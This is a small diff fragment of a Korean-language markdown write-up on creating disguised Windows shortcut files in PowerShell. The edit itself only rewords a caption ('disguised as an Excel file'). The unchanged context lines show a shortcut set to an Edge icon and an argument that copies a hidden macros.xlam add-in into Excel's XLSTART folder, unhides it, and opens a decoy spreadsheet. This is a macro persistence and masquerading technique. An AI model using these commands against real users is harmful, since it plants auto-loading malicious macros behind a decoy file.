@@ -106,7 +106,7 @@ $lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.ex
 $lnk.Save()
 ```
 
-> 엑셀로 위장
+> 엑셀 파일로 위장
 
 ``` powershell
 $lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
